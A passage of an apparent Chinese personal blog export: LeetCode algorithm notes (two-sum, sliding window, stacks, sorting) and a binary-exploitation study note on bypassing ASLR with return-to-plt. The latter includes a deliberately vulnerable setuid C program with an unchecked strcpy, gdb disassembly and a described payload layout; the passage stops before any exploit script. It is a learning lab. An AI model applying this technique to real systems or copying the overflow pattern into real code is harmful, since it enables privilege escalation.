class="keyword">and</span> nums[low] == nums[low-<span class="number">1</span>]: low += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">threeSum</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        nums.sort()</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)-<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">if</span> nums[i] &gt; <span class="number">0</span>: <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> nums[i] == nums[i-<span class="number">1</span>]: <span class="keyword">continue</span></span><br><span class="line">            tuples = self.twoSum(nums, i+<span class="number">1</span>, -nums[i])</span><br><span class="line">            <span class="keyword">for</span> tup <span class="keyword">in</span> tuples:</span><br><span class="line">                tup.append(nums[i])</span><br><span class="line">                res.append(tup)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>

<h2 id="1-两数之和"><a href="#1-两数之和" class="headerlink" title="1. 两数之和"></a><a href="https://leetcode.cn/problems/two-sum/description/">1. 两数之和</a></h2><p>这里有个小技巧：<strong>给定一个数组，当我们每次需要移动一个指针，然后遍历扫描该指针后面的数组元素的时候，其实可以用哈希表来降低算法复杂度 —— 仅需要扫一遍即可</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：nums = [2,7,11,15], target = 9</span></span><br><span class="line"><span class="comment"># 输出：[0,1]</span></span><br><span class="line"><span class="comment"># 解释：因为 nums[0] + nums[1] == 9 ，返回 [0, 1] </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">twoSum</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], target: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        hashtable = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i, num <span class="keyword">in</span> <span class="built_in">enumerate</span>(nums):</span><br><span class="line">            <span class="keyword">if</span> target - num <span class="keyword">in</span> hashtable:</span><br><span class="line">                <span class="keyword">return</span> [hashtable[target-num], i]</span><br><span class="line">            hashtable[nums[i]] = i <span class="comment"># 每次在最后往哈希表里更新即可</span></span><br><span class="line">        <span class="keyword">return</span> []</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode笔记1 - 滑动窗口解题模板</title>
    <url>/2024/03/12/leetcode-sliding-window/</url>
    <content><![CDATA[<p>因为工作关系，coding不常用到算法，每次面试&#x2F;工作中遇到都要回忆好久。因此特意总结一些常见leetcode算法的解题模板，面试&#x2F;工作中遇到一些类似的问题可以节省很多回忆的时间。</p>
<p><strong>模板并不是所有问题的最优解，对于不同类型的问题，时间&#x2F;空间复杂度都要分别再行思考，往往会有更加精巧的解法。</strong></p>
<h1 id="Leetcode笔记1-滑动窗口"><a href="#Leetcode笔记1-滑动窗口" class="headerlink" title="Leetcode笔记1 - 滑动窗口"></a>Leetcode笔记1 - 滑动窗口</h1><p><strong>核心思路：</strong></p>
<p>​	1、<strong>扩大窗口</strong>：移动右指针，直至达到特定要求（初始最优值）的时候</p>
<p>​	2、<strong>收缩窗口</strong>：记录当前最优值，并移动左指针，直至满足扩大窗口的要求</p>
<p><strong>套路模板</strong>：</p>
<p>​	双重循环：<strong>外层循环移动右指针</strong>，<strong>里层循环移动左指针</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">left, right = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> right <span class="keyword">in</span> <span class="built_in">range</span>(n): <span class="comment">## 扩大窗口，右移右指针</span></span><br><span class="line">    <span class="comment">## 处理一些窗口相关的数据</span></span><br><span class="line">    <span class="keyword">while</span> window needs shirnk: <span class="comment">## 当达到当前最优值时，收缩窗口，右移左指针 </span></span><br><span class="line">    	<span class="comment">## 处理一些窗口相关的数据</span></span><br><span class="line">        keep.remove(s[left])</span><br><span class="line">        left += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">## 一轮结束，开始新一轮扩大窗口</span></span><br><span class="line">    <span class="comment">## 处理一些窗口相关的数据</span></span><br><span class="line">    keep.add(s[right])</span><br><span class="line">    </span><br></pre></td></tr></table></figure>



<h2 id="3-无重复字符的最长子串"><a href="#3-无重复字符的最长子串" class="headerlink" title="3. 无重复字符的最长子串"></a><a href="https://leetcode.cn/problems/longest-substring-without-repeating-characters/">3. 无重复字符的最长子串</a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lengthOfLongestSubstring</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> s:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        keep = <span class="built_in">set</span>()</span><br><span class="line">        left, cur_len, max_len, n = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="built_in">len</span>(s)</span><br><span class="line">        <span class="keyword">for</span> right <span class="keyword">in</span> <span class="built_in">range</span>(n): <span class="comment">## 扩大窗口，右移右指针</span></span><br><span class="line">            cur_len += <span class="number">1</span>	<span class="comment">## 处理一些窗口相关的数据：记录当前字符串长度</span></span><br><span class="line">            <span class="keyword">while</span> s[right] <span class="keyword">in</span> keep: <span class="comment">## 当遇到重复字符时，收缩窗口，右移左指针</span></span><br><span class="line">                <span class="comment">## 处理一些窗口相关的数据：</span></span><br><span class="line">                <span class="comment">## 右移左指针（之前要先删掉窗口里的元素）</span></span><br><span class="line">                <span class="comment">## 当前长度 - 1</span></span><br><span class="line">                keep.remove(s[left]) </span><br><span class="line">                left += <span class="number">1</span></span><br><span class="line">                cur_len -= <span class="number">1</span></span><br><span class="line">            <span class="comment">## 一轮结束，需要维护最大长度值，并且增加窗口元素</span></span><br><span class="line">            max_len = <span class="built_in">max</span>(max_len, cur_len)</span><br><span class="line">            keep.add(s[right])</span><br><span class="line">        <span class="keyword">return</span> max_len</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="209-长度的最小子数组"><a href="#209-长度的最小子数组" class="headerlink" title="209. 长度的最小子数组"></a><a href="https://leetcode.cn/problems/minimum-size-subarray-sum/">209. 长度的最小子数组</a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">minSubArrayLen</span>(<span class="params">self, target: <span class="built_in">int</span>, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        left, n = <span class="number">0</span>, <span class="built_in">len</span>(nums)</span><br><span class="line">        min_len = n + <span class="number">1</span></span><br><span class="line">        sum_ = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> right <span class="keyword">in</span> <span class="built_in">range</span>(n): <span class="comment">## 扩大窗口，右移右指针</span></span><br><span class="line">            sum_ += nums[right] <span class="comment">## 求窗口的和</span></span><br><span class="line">            <span class="keyword">while</span> sum_ &gt;= target: <span class="comment">## 当和大于等于target时，收缩窗口，右移左指针</span></span><br><span class="line">                min_len = <span class="built_in">min</span>(min_len, right + <span class="number">1</span> - left) <span class="comment">## 记录最小的窗口长度</span></span><br><span class="line">                <span class="comment">## 右移左指针，当前长度-1</span></span><br><span class="line">                sum_ -= nums[left] </span><br><span class="line">                left += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> min_len == n + <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> min_len</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode笔记7 - 栈结构总结</title>
    <url>/2024/03/22/leetcode-stack/</url>
    <content><![CDATA[<h1 id="Leetcode笔记7-栈结构总结"><a href="#Leetcode笔记7-栈结构总结" class="headerlink" title="Leetcode笔记7 - 栈结构总结"></a>Leetcode笔记7 - 栈结构总结</h1><p>栈的特点是：先进后出，后进先出。</p>
<p>遇到需要先进后出的题，优先考虑栈结构。例如：匹配括号等。</p>
<h2 id="1-辅助栈"><a href="#1-辅助栈" class="headerlink" title="1. 辅助栈"></a>1. 辅助栈</h2><h3 id="20-有效的括号"><a href="#20-有效的括号" class="headerlink" title="20. 有效的括号"></a><a href="https://leetcode.cn/problems/valid-parentheses/">20. 有效的括号</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：s = &quot;()&quot;</span></span><br><span class="line"><span class="comment"># 输出：true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入：s = &quot;(]&quot;</span></span><br><span class="line"><span class="comment"># 输出：false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isValid</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="comment">## ([&#123;&#125;()])</span></span><br><span class="line">        stack = [<span class="string">&#x27;?&#x27;</span>]</span><br><span class="line">        hashmap = &#123;<span class="string">&#x27;(&#x27;</span>:<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;[&#x27;</span>:<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>:<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;?&#x27;</span>:<span class="string">&#x27;?&#x27;</span>&#125;</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">in</span> hashmap: stack.append(c)</span><br><span class="line">            <span class="keyword">elif</span> c != hashmap[stack.pop()]: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> <span class="built_in">len</span>(stack) == <span class="number">1</span> <span class="keyword">else</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>



<h2 id="2-单调栈"><a href="#2-单调栈" class="headerlink" title="2. 单调栈"></a>2. 单调栈</h2><p>单调栈是用来解决“<strong>下一个更大</strong>”类型的题目。</p>
<p>一个数组，要求你找到每个元素对应的下一个更大的元素。</p>
<p>[To do]</p>
]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode笔记4 - 排序算法总结</title>
    <url>/2024/03/19/leetcode-sort/</url>
    <content><![CDATA[<h1 id="Leetcode笔记4-排序算法总结"><a href="#Leetcode笔记4-排序算法总结" class="headerlink" title="Leetcode笔记4 - 排序算法总结"></a>Leetcode笔记4 - 排序算法总结</h1><p>总结一把最可能面试面到的排序：**快速排序 **和 <strong>归并排序</strong></p>
<h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><p><strong>核心思路</strong></p>
<ul>
<li>快速排序的思路是每次确定一个值，该值的左边都是比它小的，右边都是比它大的</li>
</ul>
<h3 id="215-数组中的第K个最大元素"><a href="#215-数组中的第K个最大元素" class="headerlink" title="215. 数组中的第K个最大元素"></a><a href="https://leetcode.cn/problems/kth-largest-element-in-an-array/">215. 数组中的第K个最大元素</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findKthLargest</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], k: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment">## 快速排序的思路是每次确定一个值，该值的左边都是比它小的，右边都是比它大的</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">partition</span>(<span class="params">nums, low, high</span>):</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">            nums[high], nums[mid] = nums[mid], nums[high]</span><br><span class="line">            </span><br><span class="line">            i = low</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(low, high):</span><br><span class="line">                <span class="keyword">if</span> nums[j] &lt;= nums[high]:</span><br><span class="line">                    nums[i], nums[j] = nums[j], nums[i]</span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">            nums[i], nums[high] = nums[high], nums[i]</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">quickSort</span>(<span class="params">nums, low, high</span>):</span><br><span class="line">            <span class="keyword">if</span> low &gt;= high:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            pi = partition(nums, low, high)</span><br><span class="line">            quickSort(nums, low, pi-<span class="number">1</span>)</span><br><span class="line">            quickSort(nums, pi+<span class="number">1</span>, high)</span><br><span class="line">        </span><br><span class="line">        quickSort(nums, <span class="number">0</span>, <span class="built_in">len</span>(nums)-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> nums[-k]</span><br></pre></td></tr></table></figure>



<h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><p><strong>核心思路</strong></p>
<ul>
<li>分成左右两个<strong>有序数组</strong>，然后要将两个数组按顺序合并好（双指针合并）</li>
<li>涉及到数组边界不清晰的时候，<strong>最好用while循环遍历数组</strong>而不用nums[low:high]的形式</li>
</ul>
<h3 id="215-数组中的第K个最大元素-1"><a href="#215-数组中的第K个最大元素-1" class="headerlink" title="215. 数组中的第K个最大元素"></a><a href="https://leetcode.cn/problems/kth-largest-element-in-an-array/">215. 数组中的第K个最大元素</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findKthLargest</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], k: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment">## 归并排序的思路是，分成左右两个有序数组，然后要将两个数组按顺序合并好</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">nums, low, mid, high</span>): <span class="comment"># 职能是将两个有序数组按顺序合并好——双指针</span></span><br><span class="line">            i, j = low, mid+<span class="number">1</span></span><br><span class="line">            res = []</span><br><span class="line">            <span class="keyword">while</span> i &lt;= mid <span class="keyword">and</span> j &lt;= high:</span><br><span class="line">                <span class="keyword">if</span> nums[i] &lt; nums[j]: </span><br><span class="line">                    res.append(nums[i])</span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>: </span><br><span class="line">                    res.append(nums[j])</span><br><span class="line">                    j += <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> i &lt;= mid:</span><br><span class="line">                res.append(nums[i])</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> j &lt;= high:</span><br><span class="line">                res.append(nums[j])</span><br><span class="line">                j += <span class="number">1</span></span><br><span class="line">            nums[low:high+<span class="number">1</span>] = res[:]</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">sort</span>(<span class="params">nums, low, high</span>):</span><br><span class="line">            <span class="keyword">if</span> low &gt;= high:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">            sort(nums, low, mid)</span><br><span class="line">            sort(nums, mid+<span class="number">1</span>, high)</span><br><span class="line">            merge(nums, low, mid, high)</span><br><span class="line">        </span><br><span class="line">        sort(nums, <span class="number">0</span>, <span class="built_in">len</span>(nums)-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> nums[-k]</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>二进制学习笔记1-ASLR绕过</title>
    <url>/2024/03/21/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-ASLR%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h1 id="二进制保护机制原理和绕过技巧"><a href="#二进制保护机制原理和绕过技巧" class="headerlink" title="二进制保护机制原理和绕过技巧"></a>二进制保护机制原理和绕过技巧</h1><h2 id="0x00-工具"><a href="#0x00-工具" class="headerlink" title="0x00 工具"></a>0x00 工具</h2><ul>
<li><strong>peda</strong></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>readelf</strong></li>
</ul>
<p>readelf的作用是<strong>用来查看当前elf文件的符号表</strong>，符号表中的信息只包括全局变量和函数名。 动态符号表(.synsym)用来保存与动态链接相关的导入导出符号，不包括模块内的符号；而systab表则保存所有的符号，包括.dynsym中的符号</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system</span><br></pre></td></tr></table></figure>



<h2 id="0x01-ASLR"><a href="#0x01-ASLR" class="headerlink" title="0x01 ASLR"></a>0x01 ASLR</h2><p>ASLR（地址空间布局随机化）的原理不作详细介绍，它可以将进程内的某些内存地址进行随机化来加大入侵难度。因此我们很难直接通过ret2libc成功利用漏洞。</p>
<p><strong>绕过ASLR核心点</strong> </p>
<ul>
<li>开启ASLR后，libc的<strong>基地址会变</strong>，但是<strong>函数的偏移量不会变</strong></li>
<li>system 函数地址 &#x3D; libc基地址 + 函数偏移量</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/65fc5d2f9f345e8d03706af0.png"></p>
<p><img src="https://pic.imgdb.cn/item/65fc5d309f345e8d03706da2.png"></p>
<h2 id="0x02-return-to-plt技术"><a href="#0x02-return-to-plt技术" class="headerlink" title="0x02 return-to-plt技术"></a>0x02 return-to-plt技术</h2><h3 id="2-1-背景知识"><a href="#2-1-背景知识" class="headerlink" title="2.1 背景知识"></a>2.1 背景知识</h3><p>在介绍这一技术前，先了解一下Linux内存布局、静态函数库和动态函数库（共享函数库）的区别以及PIC。</p>
<h4 id="2-1-1-Linux内存布局"><a href="#2-1-1-Linux内存布局" class="headerlink" title="2.1.1 Linux内存布局"></a>2.1.1 Linux内存布局</h4><p><img src="https://pic.imgdb.cn/item/65fc5d309f345e8d03706c09.png"></p>
<ul>
<li>.text 汇编代码</li>
<li>.data 无初始值的数据（静态变量，全局变量）</li>
<li>.bss 有初始值的数据 （静态变量，全局变量）</li>
<li>heap 堆</li>
<li>shared object 共享对象区域（动态库所在）</li>
<li>stack 栈</li>
<li>kernel-area 内核区域</li>
</ul>
<h5 id="2-1-2-静态函数库与动态函数库"><a href="#2-1-2-静态函数库与动态函数库" class="headerlink" title="2.1.2 静态函数库与动态函数库"></a>2.1.2 静态函数库与动态函数库</h5><p>静态函数库 —— 在程序运行前就已经被加载到目标程序里了</p>
<p>动态函数库 —— 在程序启动的时候被加载</p>
<p>不同于静态库的是，<strong>共享库的text段在多个进程间共享</strong>，<strong>但它的数据段在每个进程中是唯一的</strong>。这样设计可以减少内存和磁盘空间。正是text段在多个进程间共享，其必须只有读和执行权限。没有了写权限，动态链接器不能在text段内部重定位数据描述符(data symbol)或者函数地址。这样一来，程序运行期间，动态链接器是如何在不修改text段的情况下，重定位共享库描述符的呢? 利用PIC! [4] </p>
<p><font color=red><strong>这句话非常重要！</strong></font></p>
<h5 id="2-1-3-PIC（位置独立代码）"><a href="#2-1-3-PIC（位置独立代码）" class="headerlink" title="2.1.3 PIC（位置独立代码）"></a>2.1.3 PIC（位置独立代码）</h5><p>位置无关代码是指代码无论被加载到哪个地址上都可以正常执行。gcc选项中添加-fPIC会产生相关代码。</p>
<p>共享库的text段会指向数据段中的一个特定表，这个表用来存放全局描述符和函数的绝对虚拟地址。动态链接器作为重定位的一部分会填充这个表。因此，在重定位时，只有数据段被修改，而text段依然完好无顺。</p>
<p><strong>简言之，既然我们想让共享函数库被多个进程共享，就要让它的.text段中的数据描述符和函数地址能被重定位。可是由于.text无法被写，我们只能通过PIC来间接寻址完成！</strong></p>
<h3 id="2-2-GOT（全局偏移表）-PLT（过程链接表）"><a href="#2-2-GOT（全局偏移表）-PLT（过程链接表）" class="headerlink" title="2.2 GOT（全局偏移表）&amp; PLT（过程链接表）"></a>2.2 GOT（全局偏移表）&amp; PLT（过程链接表）</h3><h4 id="2-2-1-GOT"><a href="#2-2-1-GOT" class="headerlink" title="2.2.1 GOT"></a>2.2.1 GOT</h4><p>全局偏移表为每个全局变量分配一个4字节的表项，这4个字表项中含有全局变量的地址。当代码段中的一条指令引用一个全局变量时，这条指令指向的是GOT中的一个表项，而不是全局变量的绝对虚拟地址。当共享库被加载时，动态链接库会重定位这个GOT表项。因此，PIC利用GOT通过一层间接寻址来重定位全局描述符。</p>
<h4 id="2-2-1-PLT"><a href="#2-2-1-PLT" class="headerlink" title="2.2.1 PLT"></a>2.2.1 PLT</h4><p>过程链接表含有每个全局函数的存根代码。text段中的一条call指令不会直接调用这个函数(‘function’)，而是调用这个存根代码(function@PLT)。<strong>存根代码在动态链接器的帮助下，解析函数地址</strong>并将其拷贝到GOT(GOT[n])中。**解析过程只发生在第一次调用函数(‘function’)的时候，之后代码段中的call指令调用存根代码(function@PLT)而不是调用动态链接器去解析函数地址(‘function’)**。存根代码直接从GOT(GOT[n])获取函数地址并跳转到那里。因此，PIC利用PLT通过两层间接寻址来重定位函数地址。</p>
<p>简言之：</p>
<ul>
<li>第一次调用function时，动态链接器会解析function的地址，并拷贝到GOT(GOT(n))中</li>
<li>以后再次调用function时，只会调用存根代码(function@PLT)，而不会再次解析function的地址</li>
<li>存根代码会从GOT(GOT[n])里获取地址并跳转</li>
</ul>
<p><strong>两层间接寻址：function@PLT -&gt; GOT(GOT(n)) -&gt; function addr</strong></p>
<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><h3 id="3-1-漏洞代码"><a href="#3-1-漏洞代码" class="headerlink" title="3.1 漏洞代码"></a>3.1 漏洞代码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span> &#123;      <span class="comment">//这个函数在啊程序中并没有直接执行，但是为了后续的寻找plt进行漏洞利用，需要编译它</span></span><br><span class="line"></span><br><span class="line"> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line"> <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"> <span class="type">char</span> buf[<span class="number">256</span>];</span><br><span class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="3-2-编译"><a href="#3-2-编译" class="headerlink" title="3.2 编译"></a>3.2 编译</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">echo</span> 2 &gt; /proc/sys/kernel/randomize_va_space</span> </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">gcc -g -fno-stack-protector -o vuln vuln.c</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">sudo <span class="built_in">chown</span> root vuln</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">sudo <span class="built_in">chgrp</span> root vuln</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">sudo <span class="built_in">chmod</span> +s vuln</span></span><br></pre></td></tr></table></figure>



<h3 id="3-3-调试"><a href="#3-3-调试" class="headerlink" title="3.3 调试"></a>3.3 调试</h3><p>查看main函数的汇编</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">disassemble main</span></span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x000000000000118b &lt;+0&gt;:     push   rbp</span><br><span class="line">   0x000000000000118c &lt;+1&gt;:     mov    rbp,rsp</span><br><span class="line">   0x000000000000118f &lt;+4&gt;:     sub    rsp,0x120</span><br><span class="line">   0x0000000000001196 &lt;+11&gt;:    mov    DWORD PTR [rbp-0x114],edi</span><br><span class="line">   0x000000000000119c &lt;+17&gt;:    mov    QWORD PTR [rbp-0x120],rsi</span><br><span class="line">   0x00000000000011a3 &lt;+24&gt;:    mov    DWORD PTR [rbp-0x4],0x0</span><br><span class="line">   0x00000000000011aa &lt;+31&gt;:    mov    rax,QWORD PTR [rbp-0x120]</span><br><span class="line">   0x00000000000011b1 &lt;+38&gt;:    add    rax,0x8</span><br><span class="line">   0x00000000000011b5 &lt;+42&gt;:    mov    rdx,QWORD PTR [rax]</span><br><span class="line">   0x00000000000011b8 &lt;+45&gt;:    lea    rax,[rbp-0x110]</span><br><span class="line">   0x00000000000011bf &lt;+52&gt;:    mov    rsi,rdx</span><br><span class="line">   0x00000000000011c2 &lt;+55&gt;:    mov    rdi,rax</span><br><span class="line">   0x00000000000011c5 &lt;+58&gt;:    call   0x1030 &lt;strcpy@plt&gt;</span><br><span class="line">   0x00000000000011ca &lt;+63&gt;:    lea    rax,[rbp-0x110]</span><br><span class="line">   0x00000000000011d1 &lt;+70&gt;:    mov    rdi,rax</span><br><span class="line">   0x00000000000011d4 &lt;+73&gt;:    call   0x1040 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000000011d9 &lt;+78&gt;:    mov    eax,0x0</span><br><span class="line">   0x00000000000011de &lt;+83&gt;:    leave  </span><br><span class="line">   0x00000000000011df &lt;+84&gt;:    ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>查看shell函数的汇编</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">disassemble shell</span></span><br><span class="line">Dump of assembler code for function shell:</span><br><span class="line">   0x0000000000001169 &lt;+0&gt;:     push   rbp</span><br><span class="line">   0x000000000000116a &lt;+1&gt;:     mov    rbp,rsp</span><br><span class="line">   0x000000000000116d &lt;+4&gt;:     lea    rax,[rip+0xe90]        # 0x2004</span><br><span class="line">   0x0000000000001174 &lt;+11&gt;:    mov    rdi,rax</span><br><span class="line">   0x0000000000001177 &lt;+14&gt;:    mov    eax,0x0</span><br><span class="line">   0x000000000000117c &lt;+19&gt;:    call   0x1050 &lt;system@plt&gt;</span><br><span class="line">   0x0000000000001181 &lt;+24&gt;:    mov    edi,0x0</span><br><span class="line">   0x0000000000001186 &lt;+29&gt;:    call   0x1060 &lt;exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>找到’&#x2F;bin&#x2F;sh’的地址</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">find <span class="string">&#x27;/bin/sh&#x27;</span></span></span><br><span class="line">Searching for &#x27;/bin/sh&#x27; in: None ranges</span><br><span class="line">Found 3 results, display max 3 items:</span><br><span class="line">     vuln : 0x564f073e3004 --&gt; 0x68732f6e69622f (&#x27;/bin/sh&#x27;)</span><br><span class="line">     vuln : 0x564f073e4004 --&gt; 0x68732f6e69622f (&#x27;/bin/sh&#x27;)</span><br><span class="line">libc.so.6 : 0x7fe9a4c99117 --&gt; 0x68732f6e69622f (&#x27;/bin/sh&#x27;)</span><br></pre></td></tr></table></figure>



<h3 id="3-4-EXP"><a href="#3-4-EXP" class="headerlink" title="3.4 EXP"></a>3.4 EXP</h3><p>exp的构造，首先向缓冲区中填充256个字节的‘A’ + 向对齐空间中填充16字节的‘A’ + system@PLT的地址 + exit@PLT的地址 + system_arg的地址。</p>
